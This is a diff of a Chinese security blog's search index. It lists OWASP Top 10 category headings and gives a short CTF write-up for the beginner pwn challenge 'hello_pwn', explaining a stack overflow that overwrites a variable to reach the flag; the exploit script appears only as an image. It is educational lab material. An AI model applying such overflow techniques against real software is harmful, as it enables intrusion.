+<h2 id="Vulnerable-and-Outdated-Components，易受攻击的和过时的组件"><a href="#Vulnerable-and-Outdated-Components，易受攻击的和过时的组件" class="headerlink" title="Vulnerable and Outdated Components，易受攻击的和过时的组件"></a>Vulnerable and Outdated Components，易受攻击的和过时的组件</h2><h2 id="Identification-and-Authentication-Failures，识别和认证失败"><a href="#Identification-and-Authentication-Failures，识别和认证失败" class="headerlink" title="Identification and Authentication Failures，识别和认证失败"></a>Identification and Authentication Failures，识别和认证失败</h2><h2 id="Software-and-Data-Integrity-Failures，软件和数据完整性故障"><a href="#Software-and-Data-Integrity-Failures，软件和数据完整性故障" class="headerlink" title="Software and Data Integrity Failures，软件和数据完整性故障"></a>Software and Data Integrity Failures，软件和数据完整性故障</h2><h2 id="Security-Logging-and-Monitoring-Failures，安全日志记录和监控失败"><a href="#Security-Logging-and-Monitoring-Failures，安全日志记录和监控失败" class="headerlink" title="Security Logging and Monitoring Failures，安全日志记录和监控失败"></a>Security Logging and Monitoring Failures，安全日志记录和监控失败</h2><h2 id="Server-Side-Request-Forgery-SSRF-，服务器端请求伪造-SSRF"><a href="#Server-Side-Request-Forgery-SSRF-，服务器端请求伪造-SSRF" class="headerlink" title="Server-Side Request Forgery (SSRF)，服务器端请求伪造 (SSRF)"></a>Server-Side Request Forgery (SSRF)，服务器端请求伪造 (SSRF)</h2>]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>攻防世界pwn新手区</title>
+    <url>/2021/09/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E5%8C%BA/</url>
+    <content><![CDATA[<h1 id="攻防世界pwn新手区"><a href="#攻防世界pwn新手区" class="headerlink" title="攻防世界pwn新手区"></a>攻防世界pwn新手区</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>web学不下去了</p>
+<h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><h3 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h3><p>ida打开附件，查看main函数</p>
+<p><img src="/2021/09/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E5%8C%BA/image-20210905221215647.png" alt="image-20210905221215647"></p>
+<p>如果if条件满足，可以执行函数得到flag</p>
+<p><img src="/2021/09/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E5%8C%BA/image-20210905221233918.png" alt="image-20210905221233918"></p>
+<p>栈溢出，通过read函数读unk变量覆盖dword变量</p>
+<p><img src="/2021/09/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E5%8C%BA/image-20210905221314044.png" alt="image-20210905221314044"></p>
+<p>所以脚本如下，四个字节是unk覆盖是p64，decode是为了不报错</p>
+<p><img src="/2021/09/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E5%8C%BA/image-20210905221122958.png" alt="image-20210905221122958"></p>
+<p>执行结果</p>
+<p><img src="/2021/09/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E5%8C%BA/image-20210905221135736.png" alt="image-20210905221135736"></p>
+<p>得到flag</p>
+<p><img src="/2021/09/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E5%8C%BA/image-20210905221153138.png" alt="image-20210905221153138"></p>
+]]></content>
+      <categories>
+        <category>PWN</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
       </tags>
   </entry>
 </search>
